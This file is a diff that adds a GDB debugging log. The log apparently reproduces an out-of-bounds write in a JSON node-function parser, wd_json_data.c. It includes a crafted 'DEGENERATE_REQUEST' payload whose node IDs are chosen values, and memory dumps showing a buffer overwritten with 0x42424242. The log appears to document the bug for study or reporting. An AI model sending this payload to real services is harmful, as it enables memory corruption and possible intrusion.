@@ -1,0 +1,22 @@
+Breakpoint 1 at 0x482c: file wd_json_data.c, line 858.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+payload={"Function":"DEGENERATE_REQUEST","Flags":0,"NodeCount":2,"NodeIdList":[1094795585,1111638594]}
+&node_id_list=0x7fffffffe178  next_slot=0x7fffffffe180
+
+Breakpoint 1, parse_wd_node_function_json (json_data=0x555555564060 <buf> "{\"Function\":\"DEGENERATE_REQUEST\",\"Flags\":0,\"NodeCount\":2,\"NodeIdList\":[1094795585,1111638594]}", data_len=94, func_name=0x7fffffffe170, node_id_set=0x7fffffffe178, count=0x7fffffffe160, flags=0x7fffffffe15f "") at wd_json_data.c:858
+858			*node_id_set[i] = value->u.array.values[i]->u.integer;
+i=1
+bad_index_ptr node_id_set[1] = 0x555555564060
+chosen value = 0x42424242
+--- target bytes before ---
+0x555555564060 <buf.0>:	0x7b	0x22	0x46	0x75	0x6e	0x63	0x74	0x69
+856		for (i = 0; i < node_count; i++)
+--- target bytes after ---
+0x555555564060 <buf.0>:	0x42	0x42	0x42	0x42	0x6e	0x63	0x74	0x69
+--- store complete ---
+A debugging session is active.
+
+	Inferior 1 [process 1325864] will be killed.
+
+Quit anyway? (y or n) [answered Y; input not from terminal]
